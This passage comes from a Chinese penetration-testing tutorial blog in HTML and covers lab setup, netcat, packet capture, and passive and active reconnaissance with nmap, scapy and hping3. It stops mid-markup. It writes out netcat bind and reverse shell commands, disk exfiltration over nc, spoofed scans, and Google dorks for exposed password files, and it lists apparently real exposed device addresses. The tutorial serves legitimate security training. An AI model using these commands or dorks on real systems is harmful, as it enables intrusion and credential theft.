rel="noopener">http://dev.modern.ie/tools/vms</a></li></ul></li><li><p>安装自己的虚拟机(windows平台)</p><ul><li>xp</li><li>Win7</li><li>2003</li></ul></li><li><p>Linux虚拟机</p><ul><li><p><a href="http://www.turnkeylinux.org(提供Linux虚拟机,每一种都需渗透测试)" target="_blank" rel="noopener">http://www.turnkeylinux.org(提供Linux虚拟机,每一种都需渗透测试)</a></p></li><li><p>Ubutu  </p><ul><li>Lamp安装<ul><li>sudo apt-get install ssh</li><li>sudo apt-get install apache2</li><li>sudo apt-get install apache2-utile/</li><li>sudo service apache2 restart(报错解决: vi /etc/apache2/conf-available/fqdn.conf:ServerName:localhost)</li><li>sudo apt-get nstall mysql-server libapache2-mod-auth-mysql php5-mysql</li><li>mysql install db</li><li>mysql secure installation</li><li>sudo apt-get install php5 php5-mysql</li><li>cd /var/www/html</li><li>vi test.php</li><li>sudo init 0 关机</li><li>sudo init 6 重启</li><li>sudo init 1 单用户</li><li>sudo init 2-5 多用户</li></ul></li></ul></li><li><p>Metasploitable2(务必下载)</p><ul><li><a href="http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip" target="_blank" rel="noopener">http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip</a><ul><li>默认账户:msfadmin</li><li>查看ip:ifconfig</li></ul></li><li>问题: /var/www/multilldae/config.inc<ul><li>解决措施: <ul><li>cd /var/www/mutillidae/</li><li>vi config.inc<ul><li>$dbname=”owasp10”:^n   </li></ul></li></ul></li></ul></li></ul></li><li><p>模拟真实网络</p><ul><li><p>M0n0wall 防火墙</p><ul><li><a href="http://m0n0.ch/wall/downloads.php" target="_blank" rel="noopener">http://m0n0.ch/wall/downloads.php</a> (轻量级防火墙 downloads cdrom)</li></ul></li><li><p>部署:</p><ul><li>接外网,内网,DMZ区</li><li>256MB,8GB硬盘 m0n0虚拟机</li><li>网卡1: 桥接方式网络,连接物理网络,桥接外网 </li><li>网卡2: 仅主机,虚拟网卡</li><li>网卡3: 同网卡2</li><li>无挂载,硬盘重启</li></ul><p><img src="https://s2.ax1x.com/2020/02/29/36t9AI.png" alt="36t9AI.png"></p><ul><li>背靠背防火墙(测试复杂网络架构 模拟高级企业网络拓扑)<ul><li>Pfense(安全性高,集成大量安全插件,防护dmz)</li><li><a href="http://pfense.org/" target="_blank" rel="noopener">http://pfense.org/</a>  (类似于m0n0)</li></ul></li></ul><p><img src="https://s2.ax1x.com/2020/02/29/36teBj.png" alt="36teBj.png"></p></li></ul></li></ul></li></ul><h2 id="Kali-Linux-从入门到精通-五-基本工具使用"><a href="#Kali-Linux-从入门到精通-五-基本工具使用" class="headerlink" title="Kali Linux 从入门到精通(五)-基本工具使用"></a>Kali Linux 从入门到精通(五)-基本工具使用</h2><blockquote><p>基本工具</p></blockquote><ul><li><p>常用工具:</p><ul><li><p>经常使用且功能强大</p></li><li><p>安全从业者必不可少的帮手</p></li><li><p>Nc/ncat</p></li><li><p>Wireshark</p></li><li><p>Tcpdump</p><blockquote><p>NETCAT-NC(瑞士军刀)</p><ul><li>基本介绍      </li><li>网络工具中的瑞士军刀-小身材,大智慧</li><li>侦听模式/传输模式</li><li>telnet/获取banner模式</li><li>传输文本信息</li><li>传输文件/目录</li><li>加密传输文件</li><li>远程控制/木马</li><li>加密所用流量</li><li>流媒体服务器</li><li>远程克隆硬盘</li><li>一波操作</li><li>NC-TELNET/BANNER</li><li>nc-nv 1.1.1.1 110 (pop3 服务器)</li><li>nc-nv 1.1.1.1 25  (smtp 邮件服务器)</li><li>nc-nv 1.1.1.1 80  (网站)</li><li>nc -h 查看nc可用参数</li><li>NC-传输文本信息</li><li>A:nc -l -p 4444(打开4444端口)  使用netstat -pantu | grep 4444 查看端口是否打开</li><li>B:nc -nv 1.1.1.1 4444</li><li>nc -q 传输后直接断连接</li><li>远程电子取证信息收集</li><li>NC-传输文件/目录</li><li>传输文件</li><li>A:nc -lp 333&gt;test.mp4</li><li>B:nc -nv 1.1.1.1 333 &lt; test.mp4 -q 1</li><li>or</li><li>A: nc-q l -lp 333&lt;a.mp4</li><li>B: nc-nv 1.1.1.1 333&gt;2.mp4</li><li>传输目录</li><li>A:tar -cvf -music/ | nc-lp 333 -q 1</li><li>B:nc -nv 1.1.1.1 333 | tar -xvf -</li><li>加密传文件</li><li>A:nc -lp 333 | mcrypt -flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4</li><li>B:mcrypt –flush -Fbq -a rjindael-256-m ecb &lt;a.mp4 | nc -nv 1.1.1.1 333 -q 1(对称加密算法)</li><li>NC-流媒体服务</li><li>A:cat 1.mp4 | nc -lp 333</li><li>B:nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</li><li>NC-端口扫描</li><li>nc -nvz 1.1.1.1-65535  (探测tcp端口)</li><li>nc -nvzu 1.1.1.1-1024  (探测udp端口)</li><li>NC-远程克隆硬盘</li><li>A(接收端):nc -lp 333 | dd of=/dev/sda</li><li>B(被取证电脑):dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</li><li>远程电子取证,可以将目标服务器远程复制,或者内存</li><li>NC-远程控制</li><li>正向:<ul><li>A(服务器):nc -lp 333 -c bash</li><li>B(客户端):nc 1.1.1.1 333</li></ul></li><li>反向:<ul><li>A:nc -lp 333</li><li>B:nc 1.1.1.1 333 -c bash</li></ul></li><li>注:windows用户把bash改成cmd</li><li>适用于内网访问外网</li><li>NC-NCAT</li><li>NC缺乏加密和身份验证(肉鸡可能被窃取)的能力</li><li>Ncat包含于nmap工具包中(可实现加密,身份验证,每次会重新生成指纹信息)</li><li>A:ncat -c bash –allow 192.168.20.14 -vnl 333 –ssl</li><li>B:ncat -nv 1.1.1.1 333 –ssl</li></ul></blockquote><ul><li>不同系统/平台的nc参数功能不尽相同</li></ul></li></ul></li></ul><blockquote><p>WIRESHARK(后续补充)-被动扫描大法</p><ul><li>基本介绍<ul><li>抓包嗅探协议分析</li><li>安全专家必备的技能</li><li>抓包引擎<ul><li>Libcap9—-Linux</li><li>Winpcap10—Windows</li></ul></li><li>解码能力(评价之根本) </li></ul></li><li>基本使用方法<ul><li>启动</li><li>选择抓包网卡</li><li>混杂模式</li><li>实时抓包</li><li>保存和分析捕获文件</li><li>首选项</li></ul></li><li>WIRESHARK-筛选器<ul><li>过滤掉干扰的数据包</li><li>抓包筛选器</li><li>显示筛选器 </li></ul></li><li>WIRESHARK-常见协议包<ul><li>数据的分层结构</li><li>ARP</li><li>ICMP</li><li>TCP(三次握手)</li><li>UDP</li><li>DNS</li><li>HTTP(明文协议)</li><li>FTP</li></ul></li><li>WIRESHARK-TCP<ul><li>数据流<ul><li>HTTP</li><li>SMTP</li><li>POP3</li><li>SSL</li></ul></li></ul></li><li>WIRESHARK-信息统计<ul><li>节点数</li><li>协议分布</li><li>包大小分布</li><li>会话连接</li><li>解码方式</li><li>专家系统</li></ul></li><li>WIRESHARK-实践<ul><li>抓包对比nc,ncat加密与不加密的流量</li><li>企业抓包部署方案(采用商业化软件)<ul><li>Sniffer</li><li>Cace/riverebed (底层基于wireshark)</li><li>Cascad pilot(大流量抓包++)   </li><li>镜像端口(Cisco)<br>TCPDUMP</li><li>基本介绍</li><li>No-GUI的抓包分析工具</li><li>Linux,Unix系统默认安装</li><li>TCPDUMP-抓包</li><li>抓包</li><li>默认只抓68个字节</li><li>tcpdump -i eth0 -s 0 -2 file.pcap</li><li>tcpdump -i eth0 port 22</li><li>读取抓包文件</li><li>tcpdump -r file.pcap</li><li>TCPDUMP-筛选</li><li>tcpdump -n http.cap | awk ‘{print $3}’ | sort -u </li><li>tcpdump -n src host [ip address] -r http.cap</li><li>tcpdump -n dst host [ip address] -r http.cap</li><li>tcpdump -n port 53 -r http.cap</li><li>tcpdump -nX port 80 -r http.cap</li><li>TCP 高级筛选</li><li>tcpdump -A -n ‘tcp[13]=24’ -r http.cap</li><li>过程文档记录</li><li>Dradis(Kali 自带)</li><li>短期临时小团队资源共享</li><li>各种插件导入问价</li><li>Keepnote </li><li>Truecrypt(注重信息保密)</li><li>团队中需要文档人员</li></ul></li></ul></li></ul></blockquote><h2 id="Kali-Linux-从入门到精通-七-被动信息收集"><a href="#Kali-Linux-从入门到精通-七-被动信息收集" class="headerlink" title="Kali Linux 从入门到精通(七)-被动信息收集"></a>Kali Linux 从入门到精通(七)-被动信息收集</h2><blockquote><p>被动信息收集</p><ul><li>公开渠道可获得的信息</li><li>与目标系统不产生直接交互</li><li>尽量避免留下一切痕迹</li><li>OSINT<ul><li>美国军方</li><li>北大西洋公约组织<ul><li>Passive reconnaissance(no direct interaction)</li><li>normal interaction</li><li>Active reconnaissance</li><li>More information greater chance of direction<br>信息收集内容</li></ul></li></ul></li><li>IP地址段</li><li>域名信息</li><li>邮件地址</li><li>文档图片数据</li><li>公司地址</li><li>公司组织架构</li><li>联系电话/传真号码</li><li>人员姓名/职位</li><li>目标系统使用的技术架构</li><li>公开的商业信息<br>信息用途</li><li>用信息描述目标</li><li>发现</li><li>社会工程学攻击</li><li>物理缺口</li></ul></blockquote><blockquote><p>信息收集-DNS</p><ul><li>域名与FQDN的区别<ul><li>sina.com 实际域名</li><li><a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a> 完全限定域名 简称为FQDN</li></ul></li><li>域名记录:A(主机记录),Cname(解析成另外一个域名) NS(域的域名服务器记录),MX(邮件交换记录),ptr(不同于前面,通过ip地址解析域名 反向域名 解析)<ul><li>递归查询</li><li>迭代查询<br>DNS信息收集–NSLOOKUP<ul><li>nslookup <a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a></li><li>server</li><li>type=a,mx,ns,any</li><li>nslookup -type example.com 156.154.70.22</li><li>text:spf 通过反向域名查询,判断,从而反垃圾邮件<br>DNS信息收集-DIG</li><li>dig @8.8.8.8 <a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a> mx</li><li>dig <a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a> any</li><li>反向查询: dig +noall +answer -x 8.8.8.8</li><li>bind版本信息:dig +noall +answer txt chaos VERSION.BAND @ns3.dnsv4.com</li><li>DNS追踪: dig +trace example.com</li><li>抓包比较递归查询,迭代查询过程的区别<br>DNS区域传输</li><li>dig @nsl.example.com example.com axfr</li><li>host -T -l sina.com 8.8.8.8<br>DNS 字典爆破</li><li>firece -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist a.txt</li><li>dnsdict6 -d4 -t 16 -x sina.com</li><li>dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml</li><li>dnsrecon -d sina.com –lifetime 10 -t brt -D dnsbig.txt</li><li>dnscrecon -t std -d sina.com<br>DNS 注册信息</li><li>whois</li><li>whois -h whois.apnic.net 192.0.43.10</li><li>AFRINIC</li><li>APNIC</li><li>ARIN</li><li>IANA</li><li>ICANN</li><li>LACNIC</li><li>NRO</li><li>RIPE</li><li>InterNic<br>搜索引擎</li><li>公司新闻动态</li><li>重要雇员信息</li><li>机密文档/网络拓扑</li><li>用户名密码</li><li>目标系统软硬技术架构<br>SHODAN</li><li>搜索联网的设备</li><li>Banner:http,ftp,ssh,telnet</li><li><a href="https://www,shodan.io/" target="_blank" rel="noopener">https://www,shodan.io/</a></li><li>常见filter:</li><li>net (192.168.20.1)</li><li>city</li><li>country(CN,US)</li><li>port(80,21,22,23)</li><li>os</li><li>Hostname(主机或域名)</li><li>server </li><li>200 OK cisco country:IP</li><li>user:admin pass:password</li><li><a href="http://1.179.177.109:81/index.htm" target="_blank" rel="noopener">http://1.179.177.109:81/index.htm</a></li><li>linux upnp avtech<ul><li><a href="http://75.69.59.49:8000" target="_blank" rel="noopener">http://75.69.59.49:8000</a></li></ul></li><li><a href="https://account.shodan.io/" target="_blank" rel="noopener">https://account.shodan.io/</a></li><li><a href="https://www.shodan.io/explore" target="_blank" rel="noopener">https://www.shodan.io/explore</a></li><li>Add-Ons<br>Google 搜索</li><li>+ 充值 - 支付</li><li>北京的电子商务公司—北京 intitle:电子商务 intext 法人 intext 电话</li><li>阿里网站上的北京公司联系人-北京 site:alibaba.com inurl:contact</li><li>塞班司法案的PDF文档-SOX filetype.pdf</li><li>法国的支付相关页面-payment site:fr</li><li>Google搜索实例<ul><li>input:”level/15/exec/~/show”(交换机)</li><li>intitle:”netbotz appliance””ok”(摄像头)</li><li>inurl /admin/login.php(php登录界面 可爆破)</li><li>inurl:qq.txt(qq号)</li><li>filetype:xls “username | password”</li><li>input:ftp “password” filetype:xls site:baidu.com(ftp)</li><li>inurl:Service.pwd(微软漏洞)</li></ul></li></ul></li></ul></li></ul></blockquote><pre><code>- http://exploit-db.com/google-dorks(谷歌黑客数据库)(google hacking)- 不同浏览器都有其特有的搜索语法,需熟悉</code></pre><blockquote><p>YANDEX</p></blockquote><ul><li>世界第四大搜索引擎-俄罗斯</li><li><a href="https://www.yandex.com/" target="_blank" rel="noopener">https://www.yandex.com/</a></li><li>偶尔有惊喜<blockquote><p>用户信息</p></blockquote></li><li>邮件,主机<ul><li>theharvester -d sina.com -l 300 -b google</li></ul></li><li>文件<ul><li>metagoofill -d microsoft.com -t pdf -l 200 -o test -f 1.html</li></ul></li></ul><blockquote><p>MELTAGO(收集信息)</p><ul><li>申请账号</li><li>登录使用<br>其他路径</li><li>社交网络</li><li>工商注册</li><li>新闻组/论坛</li><li>招聘网站</li><li><a href="http://www.archive.org/web/web.php(可查看不同年份的网站代码)" target="_blank" rel="noopener">http://www.archive.org/web/web.php(可查看不同年份的网站代码)</a><br>个人专属的密码字典</li><li>按个人信息生成其专属的密码字典</li><li>CUPP-Common User Password Profiler<ul><li>git clone <a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a></li><li>python cup.py -i<br>METADATA</li></ul></li><li>Exif图片信息(图片会记录GPS信息 默认打开)</li><li>Foca</li></ul></blockquote><blockquote><p>RECON-NG</p><ul><li>全特性的web侦查框架</li><li>基于Python开发</li><li>web 信息搜索框架</li><li>命令格式与msf一致</li><li>基于Python开发</li><li>使用方法:<ul><li>模块</li><li>数据库</li><li>报告</li></ul></li><li>DNS查询<ul><li>Google</li><li>Baidu</li><li>Bing</li><li>Yahoo</li><li>Brute force</li></ul></li><li>解析IP地址(查询数据库)</li><li>联系人</li><li>报告 </li><li>API</li></ul></blockquote><h2 id="Kali-Linux-从入门到精通-八-主动信息收集"><a href="#Kali-Linux-从入门到精通-八-主动信息收集" class="headerlink" title="  Kali Linux 从入门到精通(八)-主动信息收集"></a>  Kali Linux 从入门到精通(八)-主动信息收集</h2><blockquote><p>基本介绍 </p><ul><li>直接与目标系统交互通信</li><li>无法避免留下访问的痕迹</li><li>使用受控的第三方电脑进行探测<ul><li>使用代理或已经被控制的主机</li><li>做好被封杀的准本</li><li>使用噪声迷惑目标,淹没真实的探测流量</li></ul></li><li>扫描<ul><li>发送不同的探测,根据返回结果判断目标状态<br>发现<ul><li>识别活着的主机</li></ul></li><li>潜在的被攻击目标<ul><li>输出一个IP地址列表</li><li>2,3,4层发现<br>二层发现(渗透进目标系统后,发现内网其他信息)</li></ul></li></ul></li><li>优点:扫描速度快,可靠</li><li>缺点:不可路由</li><li>Arp协议:抓包<br>二层发现–arping命令:<ul><li>arping</li><li>arping 1.1.1.1 -c 1</li><li>arping 1.1.1.1 -d   (发现重复响应, 两个不同的MAC地址拥有同一个IP,而此时IP为网关地址,此时即为ARP欺骗,实现中间人攻击,窃取密码,篡改数据等恶意参数)</li><li>arping -c 1.1.1.1 | grep “bytes from” | cut -d”” -f 5 | cut -d “(“ -f 2 | cut -d”)” -f 1</li><li>脚本 <ul><li>arping1.sh eth0 &gt; addr</li><li>arping2.sh addrs<br>二层发现–nmap 在二层发现中的应用</li></ul></li></ul></li><li>nmap 1.1.1.1-254 -sn(可进行网段扫描 -sn表示不进行网段扫描)</li><li>nmap -iL iplist.txt -sn(可对文本文件进行扫描)</li><li>nmap很强大 后面单独介绍</li></ul></blockquote><blockquote><p>二层发现–Netdiscover</p><ul><li>专用于二层发现</li><li>可用于无线和交换环境</li><li>主动和被动探测<ul><li>主动<ul><li>netdiscover -i eth0 -r 1.1.1.0/24</li><li>netdiscover -l iplist.txt</li></ul></li><li>被动<ul><li>netdiscover -p   (将网卡置于混杂模式)</li><li>主动arp容易触发报警(入侵检测系统触发报警)<br>二层发现–Scapy </li></ul></li></ul></li><li>作为Python库进行调用</li><li>也可作为单独的工具使用</li><li>抓包,分析,创建.修改,注入流量</li><li>apt-get install python-gnuplot(处理报警信息)</li><li>Scapy<ul><li>ARP().display()</li><li>Sr1()</li></ul></li><li>Python 脚本<ul><li>Arp1.py<ul><li>subprocess:调用操作系统</li></ul></li><li>Arp2.py<br>发现-三层发现</li></ul></li><li>优点<ul><li>可路由</li><li>速度比较快</li></ul></li><li>缺点<ul><li>速度比二层慢</li><li>经常被边界防火墙过滤</li></ul></li><li>IP,ICMP协议<br>三层发现-PING命令 </li><li>Ping 1.1.1.1 -c 2</li><li>Ping -R 1.1.1.1 / tracetoute 1.1.1.1</li><li>Ping 1.1.1.1 -c 1 | grep “bytes from” | cut -d” “ -f 4 | cut -d “:” -f 1</li><li>脚本<br> Ping.sh 1.1.1.0<br>三层发现-Scapy</li><li>OSI多层堆叠 手工生成ICMP包/ICMP</li><li>ip=IP()</li><li>ip.dst=”1.1.1.1”</li><li>ping=ICMP()</li><li>a=sr1(ip/ping)</li><li>a.display()</li><li>Ping 不存在的地址<ul><li>a=sr1(ip/icmp.timeout=1)</li></ul></li><li>a=sr1(IP(dst=”1.1.1.1”)/ICMP().timeout=1)</li><li>脚本<br>三层发现-nmap</li><li>nmap -sn 1.1.1.1-255</li><li>nmap -iL iplist.txt -sn<br>三层发现-fping</li><li>fping 1.1.1.1 -c 1</li><li>fping -g 1.1.1.1 1.1.1.2</li><li>fping -g 1.1.1.0/24</li><li>fping -f iplist.txt<br>三层发现-Hping</li><li>能够发送几乎所有TCP/IP包</li><li>功能强大但每次只能扫描一个目标:(</li><li>hping3 1.1.1.1 -icmp -c 2</li><li>for addr in$(seq 1 254):do hping3 1.1.1.$addr –icmp -c 1 &gt;&gt; handle.txt &amp; done<br>发现-四层发现</li><li>优点:<ul><li>可路由且结果可靠</li><li>不太可能被防火墙过滤</li><li>甚至可以发现所有端口都被过滤的主机</li></ul></li><li>缺点:<ul><li>基于状态过滤的防火墙可能过滤扫描</li><li>全端口扫描速度慢</li></ul></li><li>TCP<ul><li>未经过请求的ACK-RST(可用于判断主机是否存活)</li><li>SYN-SYN/ACK,RST</li></ul></li><li>UDP<ul><li>ICMP端口不可达,一去不复返<br>四层发现–Scapy(TCP发现)</li></ul></li><li>ACK-TCP Port–RST</li><li>Scapy<ul><li>i=IP()</li><li>i.dst=”<a href="http://www.baidu.com&quot;" target="_blank" rel="noopener">www.baidu.com&quot;</a></li><li>t=TCP()</li><li>t.flags=’A’</li><li>r=(i/t)</li><li>a=sr1(r)</li><li>a.display()</li></ul></li><li>a=sr1(IP(dst=”<a href="http://www.baidu.com&quot;)/TCP(dport=80,flags=&#39;A&#39;),timeout=1" target="_blank" rel="noopener">www.baidu.com&quot;)/TCP(dport=80,flags=&#39;A&#39;),timeout=1</a>))</li><li>ACK_Ping.py<br>四层发现–Scapy(UDP发现)</li><li>UDP-UDP Port-ICMP</li><li>i=IP()</li><li>u=UDP()</li><li>u.dport=33333</li><li>r=(i/u)</li><li>a=sr1(r.timeout=1,verbose=1)</li><li>A.display()<ul><li>ICMP</li></ul></li><li>UDP_Ping.py<ul><li>UDP发现不可靠<br>四层发现-nmap</li></ul></li><li>nmap 1.1.1.1-254 -PU53 -sn</li><li>nmap 1.1.1.1-254 -PA80 -sn</li><li>nmap -iL iplist.txt -PA80 -sn<br>四层发现</li><li>hping3 -udp 1.1.1.1 -c 1</li><li>for addr in $(seq 1,254); do hping3 -udp 1.1.1.$addr -c 1 &gt;&gt; r.txt; done<ul><li>grep Unreachable.txt | cut -d” “ -f 5 | cut -d “=” -f 2</li><li>./udp_hping.sh 1.1.1.0</li></ul></li><li>hping3 1.1.1.1 -c 1 (TCP)<ul><li>hping3 1.1.1.1</li><li>./TCP_hping.sh</li><li>Flag 0–ACK.RST<br>端口扫描<ul><li>端口对应网服务及应用端程序</li><li>服务端程序的漏洞通过端口攻入</li><li>发现开发的端口</li><li>更具体的攻击面</li><li>攻击流程:发现活的IP-&gt;发现开发端口-&gt;通过端口漏洞攻入<br>端口扫描之UDP端口扫描</li><li>假设ICMP port-unreachable 响应代表端口关闭</li></ul></li><li>目标系统不响应ICMP port-unreachable时,可能产生误判<ul><li>完整的UDP应用层请求</li></ul></li><li>准确性高</li><li>耗时巨大<ul><li>具体操作</li><li>Scapy UDP Scan<ul><li>端口关闭:ICMP port-unreacheable</li><li>端口开放:没有回包</li><li>了解每一种基于UDP的应用层结构很有绷住</li><li>与三层相同的技术</li><li>误判</li></ul></li><li>Scapy <ul><li>sr1(IP(dst=”1.1.1.1”)/UDP(dport=53).timeout=1,verbose=1)</li></ul></li><li>./udp_scan.py 1.1.1.1 1 100<br>端口扫描(UDP)-nmap</li><li>Nmap</li><li>nmap -sU 1.1.1.1</li><li>默认的1000个参数</li><li>ICMP host-unreachable</li><li>nmap 1.1.1.1 -sU -p 53</li><li>nmap -iL iplist.txt -sU -p 1-220</li></ul></li></ul></li></ul></blockquote><blockquote><p>端口扫描(TCP)-nmap</p><ul><li>TCP 端口扫描<ul><li>基于连接的协议</li><li>三次握手<br><img src="https://imgageblog.cdn.bcebos.com/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20190801230307.png" alt></li><li>隐蔽扫描–syn<ul><li>不建立完整连接</li><li>应用日志不记录扫描行为-隐蔽</li></ul></li></ul></li></ul></blockquote><pre><code>- 僵尸扫描- 端口开放状态:   ![](https://imgageblog.cdn.bcebos.com/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20190801230314.png)- 端口状态   ![](https://imgageblog.cdn.bcebos.com/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20190801230320.png)    - 极度隐蔽    - 实施条件苛刻    - 可伪造源地址    - 选择僵尸机       - 闲置系统       - 系统使用递增的IPID          - 0          - 随机- 全连接扫描- 所有TCP扫描方式都是基于三次握手的变化来判断目标端口状态</code></pre><blockquote><p>隐蔽端口扫描</p><ul><li>Syn-syn.ack-rst</li><li>Scapy<ul><li>srl(IP(dst=”your ip address”)/TCP(dport=80),timeout=1,verbose=1)</li><li>./syn_scan.py</li></ul></li><li>namp<ul><li>nmap -sS 1.1.1.1 -p 80.21.25.110 443</li><li>nmap -sS 1.1.1.1 -p –65535 –open</li><li>nmap -sS 1.1.1.1 -p –open</li><li>nmap -sS -iL iplist.txt -p 80</li></ul></li><li>hping3<ul><li>hping3 1.1.1.1 –scan 80 -S</li><li>hping3 1.1.1.1 –scan [ip] -S</li><li>hping3 1.1.1.1 –scan 0-65535 -S</li><li>hping3 -c 10 -S –spoof [伪造IP] -p ++1 1.1.1.1.3<br>全连接端口扫描</li><li>Scapy </li><li>Syn扫描不需要raw packets</li><li>内核认为syn/ack是非法包,直接发rst中断连接</li><li>全连接扫描对scapy比较困难</li><li>sr1(IP(dst=”<a href="http://www.baidu.com&quot;)/TCP(dport=22,flags=&#39;S&#39;)" target="_blank" rel="noopener">www.baidu.com&quot;)/TCP(dport=22,flags=&#39;S&#39;)</a>)</li><li>./tcp_scan1.py</li><li>./tcp_scan2.py</li><li>iptables(Linux防火墙) -A OUTPUT -p tcp –tcp–flags RST RST -d “<a href="http://www.baidu.com&quot;" target="_blank" rel="noopener">www.baidu.com&quot;</a> -j DROP</li><li>nmap</li><li>nmap -sT 1.1.1.1 -p 80</li><li>nmap -sT 1.1.1.1 -p 80.21.25</li><li>nmap -sT 1.1.1.1 -p 80-200</li><li>nmap -sT iplist.txt -p 80</li><li>默认1000个常用端口</li><li>dmiltry</li><li>功能简单,但使用简便</li><li>默认150个最常用的端口</li><li>dmiltry -p 172.16.36.135</li><li>dmiltry -p 172.16.36.135 -o output</li><li>nc</li><li>nc -nv -w 1 -z [your ip address ] 1-100</li><li>for x in ${seq 20 30}; do nc -nv -w 1 -z 1.1.1.1 $x; done | grep open</li><li>for x in $(seq 1 254); do nc -nv -w 1 -z 1.1.1.$x 80; done<br>僵尸扫描(条件苛刻 需要合格的僵尸机)</li><li>合格的僵尸机:xp系统,windows 2003 server</li><li>Scapy-zombie.py<ul><li>i=IP()</li><li>t=TCP()</li><li>rz=(i/f)</li><li>rt=(i/t)</li><li>rz[IP].dst=IPz</li><li>rz[TCP].dport=445</li><li>rt[IP].src=IPz</li><li>rt[IP].dst=IPt</li><li>rt[TCP].dport=22</li><li>az1=sr1(rz)  / at=sr1(rt)  / az2=sr1(rz)</li><li>az1.dsiplay() / az2.display()</li></ul></li><li>xp:僵尸机,metasploit:目标机,kali:扫描机</li><li>nmap</li></ul></li><li>发现僵尸机<ul><li>nmap -p445  <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> –script=ipideseq nse </li></ul></li><li>扫描目标<ul><li>nmap 172.16.36.135 -sl 172.16.36.134 -Pn -p 0-100<br>服务扫描</li></ul></li><li>识别开放端口上运行的应用</li><li>识别目标操作系统</li><li>提高攻击效率<ul><li>Banner捕获</li><li>服务识别</li><li>操作系统识别</li><li>SNMP分析</li><li>防火墙识别<br>Banner捕获</li></ul></li><li>软件开发商</li><li>软件名称</li><li>服务类型</li><li>版本号<ul><li>直接发现已知的漏洞和弱点</li></ul></li><li>连接建立后直接获取banner</li><li>另类服务识别方法<ul><li>特征行为和响应字段</li><li>不同的响应可用于识别底层操作系统</li></ul></li><li>基本操作<ul><li>way1: nc -nv [your ip address]</li><li>way2:python socket:socket 模块用于连接网络服务 <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">banner=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">banner.connect((&quot;www.baidu.com&quot;,21))</span><br><span class="line">banner.recv(4096)   # 接收数据大小</span><br><span class="line">banner.close()</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure></li></ul></li></ul></blockquote><pre><code>- Banner不允许抓取,recv无返回将挂起- way3:     - dmitry -p www.baidu.com    - dmitry -pb www.baidu.com- way4:    - nmap -sT [ip address] -p 22 --script=banner nse- way5:    - amap -B &quot;ip address&quot;    - amap -B &quot;ip address&quot; 1-65535    - amap -B &quot;ip address&quot; 1-65535 | grep on    - amap [ip address]    - amap [ip address] -q    - amap [ip address] -qb</code></pre><ul><li>Banner 信息抓取能力有限</li><li>nmap响应特征分析识别服务<ul><li>发送系列复杂的探测</li><li>依据响应特征signature</li></ul></li><li>nc -nv 1.1.1.1 80</li><li>nmap 1.1.1.1 -p 80 -sV</li></ul><blockquote><p>SNMP</p><ul><li>简单网络管理协议</li><li>Community strings</li><li>信息查询或重新配置</li><li>识别和绕过防火墙筛选<br>操作系统识别<ul><li>操作系统识别技术</li><li>种类繁多</li><li>好产品采用多种技术组合</li><li>TTL起始值</li><li>Windows: 128(65-128)</li><li>Linux/Unix:64 (1-64)</li><li>某些Unix:255</li><li>python脚本<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span 